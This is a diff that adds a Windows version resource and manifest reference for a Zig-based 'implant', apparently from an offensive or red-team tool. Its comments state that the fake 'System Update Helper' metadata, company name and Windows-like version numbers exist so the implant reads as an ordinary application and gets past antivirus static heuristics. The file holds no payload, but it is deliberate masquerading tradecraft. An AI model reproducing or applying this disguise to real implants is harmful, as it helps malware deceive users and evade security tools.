@@ -1,0 +1,45 @@
+// Windows version resource + application manifest for the Zig implant.
+// Mirrors crates/implant/build.rs (winres) + updatehelper.manifest so the exe's
+// PE metadata reads as an ordinary "System Update Helper" application rather
+// than a stripped, metadata-less binary. Compiled by Zig's built-in RC
+// compiler (resinator) via build.zig::addWin32ResourceFile.
+//
+// Constants defined manually (Zig's RC has no <windows.h>); RT_MANIFEST = 24.
+
+#define RT_MANIFEST 24
+
+// Application manifest (asInvoker + common controls + Win7-11 supportedOS).
+// ID 1 = the exe's own manifest (a DLL would use ID 2).
+1 RT_MANIFEST "updatehelper.manifest"
+
+// VERSIONINFO — what right-click -> Properties -> Details and AV static
+// heuristics read. Deliberately generic: a "system update helper".
+1 VERSIONINFO
+FILEVERSION    10,0,22621,0
+PRODUCTVERSION 10,0,22621,0
+FILEFLAGSMASK  0x3fL
+FILEFLAGS      0x0L
+FILEOS         0x40004L
+FILETYPE       0x1L
+FILESUBTYPE    0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "FileDescription", "System Update Helper"
+            VALUE "ProductName",    "System Update Helper"
+            VALUE "CompanyName",    "System Update Helper Project"
+            VALUE "LegalCopyright", "\251 2026 System Update Helper Project. All rights reserved."
+            VALUE "OriginalFilename", "updatehelper.exe"
+            VALUE "InternalName",   "updatehelper"
+            VALUE "Comments",       "Applies periodic system maintenance and compatibility updates."
+            VALUE "FileVersion",    "10.0.22621.0"
+            VALUE "ProductVersion", "10.0.22621.0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 1200
+    END
+END
